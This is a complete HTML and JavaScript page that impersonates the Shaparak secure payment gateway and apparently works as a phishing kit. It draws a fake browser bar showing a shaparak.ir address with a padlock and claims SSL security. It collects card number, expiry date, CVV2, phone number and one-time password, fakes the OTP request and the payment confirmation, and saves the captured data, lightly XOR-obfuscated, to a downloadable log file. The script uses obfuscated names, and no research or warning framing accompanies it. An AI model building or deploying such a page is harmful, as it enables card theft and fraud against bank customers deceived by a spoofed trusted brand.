<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>درگاه پرداخت امن شاپرک</title>
    <style>
        :root {
            --primary: #004d40;
            --secondary: #28a745;
            --shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
            --font: Arial, sans-serif;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: var(--font);
            background: linear-gradient(145deg, #f5f5f5, #e0e0e0);
            min-height: 100vh;
            display: grid;
            place-items: center;
        }
        .x1-bar {
            position: fixed;
            top: 0;
            width: 100%;
            background: #fff;
            padding: 8px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
            z-index: 10000;
        }
        .x1-bar .x2-icon { color: #28a745; margin-left: 5px; }
        .x1-bar .x3-url {
            background: #f1f1f1;
            padding: 6px 12px;
            border-radius: 20px;
            direction: ltr;
            text-align: left;
            flex-grow: 1;
        }
        header {
            background: var(--primary);
            color: #fff;
            padding: 20px;
            text-align: center;
            position: fixed;
            top: 40px;
            width: 100%;
            z-index: 100;
        }
        header img { height: 50px; }
        .x4-progress {
            max-width: 700px;
            margin: 120px auto 20px;
            background: #fff;
            padding: 8px;
            border-radius: 25px;
        }
        .x5-bar {
            height: 10px;
            background: #ddd;
            border-radius: 12px;
        }
        .x6-fill {
            height: 100%;
            background: var(--secondary);
            width: 0;
            transition: width 0.5s;
        }
        .x7-container {
            background: #fff;
            padding: 40px;
            border-radius: 20px;
            width: 90%;
            max-width: 700px;
            border: 1px solid #eee;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .x8-badge {
            position: absolute;
            top: 15px;
            left: 15px;
            background: #e8f5e9;
            padding: 8px 15px;
            border-radius: 25px;
            font-size: 13px;
            color: var(--secondary);
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .x9-step { display: none; }
        .x9-step.active { display: block; }
        .x10-group { margin-bottom: 20px; }
        label { font-size: 15px; color: #333; margin-bottom: 8px; display: block; }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            direction: rtl;
            text-align: right;
        }
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn-x11 { background: var(--secondary); color: #fff; }
        .btn-x12 { background: #007bff; color: #fff; width: auto; padding: 10px 20px; margin-top: 10px; }
        .x13-loader {
            display: none;
            width: 60px;
            height: 60px;
            border: 6px solid #ddd;
            border-top: 6px solid var(--secondary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 25px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .x14-timer { font-size: 14px; color: #555; text-align: center; margin-top: 15px; }
        footer {
            background: #f5f5f5;
            padding: 20px;
            text-align: center;
            font-size: 13px;
            color: #666;
            width: 100%;
            position: fixed;
            bottom: 0;
        }
    </style>
</head>
<body>
    <div class="x1-bar">
        <span class="x2-icon">🔒</span>
        <span class="x3-url">https://secure.shaparak.ir/pay/verify?session=xyz123</span>
    </div>

    <header>
        <img src="https://via.placeholder.com/50?text=شاپرک" alt="شاپرک">
        <h1>درگاه پرداخت امن شاپرک</h1>
    </header>

    <div class="x4-progress">
        <div class="x5-bar">
            <div class="x6-fill" id="x6-fill"></div>
        </div>
    </div>

    <div class="x7-container">
        <div class="x8-badge">
            <span>🔒</span> پرداخت امن با پروتکل SSL 256 بیتی
        </div>

        <div class="x9-step active" id="x9-step1">
            <div class="x10-group">
                <label for="x15">شماره کارت</label>
                <input type="text" id="x15" placeholder="---- ---- ---- ----" maxlength="19">
            </div>
            <div class="x10-group">
                <label for="x16">تاریخ انقضا</label>
                <input type="text" id="x16" placeholder="MM/YY" maxlength="5">
            </div>
            <div class="x10-group">
                <label for="x17">CVV2</label>
                <input type="text" id="x17" placeholder="***" maxlength="4">
            </div>
            <button class="btn btn-x11" id="x18">مرحله بعد</button>
        </div>

        <div class="x9-step" id="x9-step2">
            <div class="x10-group">
                <label for="x19">شماره تلفن</label>
                <input type="tel" id="x19" placeholder="09XX-XXX-XXXX" maxlength="13">
            </div>
            <div class="x10-group">
                <label for="x20">رمز پویا</label>
                <input type="text" id="x20" placeholder="******" maxlength="6">
                <button class="btn btn-x12" id="x21">درخواست رمز پویا</button>
            </div>
            <div class="x14-timer" id="x22"></div>
            <button class="btn btn-x11" id="x23">تأیید و پرداخت</button>
        </div>

        <div class="x9-step" id="x9-step3">
            <div id="x24" style="text-align: center; font-size: 20px; padding: 20px;"></div>
            <div class="x13-loader" id="x25"></div>
        </div>
    </div>

    <footer>
        <p>پشتیبانی: 021-12345678 | تمامی حقوق محفوظ است © شاپرک ۱۴۰۳</p>
    </footer>

    <script>
        (function() {
            let _0x1a = 1; // currentStep
            let _0x2b = []; // secretData
            const _0x3c = 42; // XOR key

            // DOM Elements
            const _0x4d = document.getElementById('x6-fill');
            const _0x5e = [document.getElementById('x9-step1'), document.getElementById('x9-step2'), document.getElementById('x9-step3')];

            // XOR Encryption/Decryption
            function _0x6f(_0x7g) {
                let _0x8h = '';
                for (let i = 0; i < _0x7g.length; i++) {
                    _0x8h += String.fromCharCode(_0x7g.charCodeAt(i) ^ _0x3c);
                }
                return _0x8h;
            }

            // Input Formatting
            document.getElementById('x15').addEventListener('input', function(e) {
                let v = e.target.value.replace(/\D/g, '').slice(0, 16);
                e.target.value = v.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
            });
            document.getElementById('x16').addEventListener('input', function(e) {
                let v = e.target.value.replace(/\D/g, '');
                if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
                e.target.value = v.slice(0, 5);
            });
            document.getElementById('x17').addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
            });
            document.getElementById('x19').addEventListener('input', function(e) {
                let v = e.target.value.replace(/\D/g, '').slice(0, 11);
                e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
            });
            document.getElementById('x20').addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            });

            // Fake Server Call
            function _0x9i(_0xaj, _0xbk) {
                setTimeout(() => {
                    _0xbk({ status: 'success', id: 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase() });
                }, 1500 + Math.random() * 1000);
            }

            // Progress Update
            function _0xcl() {
                _0x4d.style.width = `${(_0x1a / 3) * 100}%`;
            }

            // Save Data
            function _0xdm() {
                let _0xen = document.getElementById('x15').value + '|' +
                           document.getElementById('x16').value + '|' +
                           document.getElementById('x17').value + '|' +
                           document.getElementById('x19').value + '|' +
                           document.getElementById('x20').value;
                _0x2b.push(_0x6f(_0xen));
            }

            // Export Data as File
            function _0xfo() {
                let _0xgp = _0x2b.map(d => _0x6f(d)).join('\n');
                let _0xhq = new Blob([_0xgp], { type: 'text/plain' });
                let _0xir = document.createElement('a');
                _0xir.href = URL.createObjectURL(_0xhq);
                _0xir.download = 'payment-log.txt';
                _0xir.click();
            }

            // Step Navigation
            document.getElementById('x18').addEventListener('click', () => {
                if (_0x1a === 1 && document.getElementById('x15').value && document.getElementById('x16').value && document.getElementById('x17').value) {
                    _0x5e[0].classList.remove('active');
                    _0x1a = 2;
                    _0x5e[1].classList.add('active');
                    _0xcl();
                }
            });
            document.getElementById('x23').addEventListener('click', () => {
                if (_0x1a === 2 && document.getElementById('x19').value && document.getElementById('x20').value) {
                    _0xdm();
                    _0x5e[1].classList.remove('active');
                    _0x1a = 3;
                    _0x5e[2].classList.add('active');
                    _0xcl();
                    document.getElementById('x25').style.display = 'block';
                    _0x9i({}, (_0xjs) => {
                        document.getElementById('x25').style.display = 'none';
                        document.getElementById('x24').innerHTML = `پرداخت موفق!<br>شماره تراکنش: ${_0xjs.id}`;
                        _0xfo();
                    });
                }
            });

            // Fake OTP Request
            document.getElementById('x21').addEventListener('click', () => {
                if (document.getElementById('x19').value) {
                    _0x9i({}, () => {
                        alert('رمز پویا ارسال شد!');
                        let _0xkt = 120;
                        let _0xlu = setInterval(() => {
                            document.getElementById('x22').textContent = `زمان باقی‌مانده: ${Math.floor(_0xkt / 60)}:${(_0xkt % 60).toString().padStart(2, '0')}`;
                            if (--_0xkt < 0) {
                                clearInterval(_0xlu);
                                document.getElementById('x22').textContent = 'رمز منقضی شد';
                            }
                        }, 1000);
                    });
                }
            });

            _0xcl();
        })();
    </script>
</body>
</html>
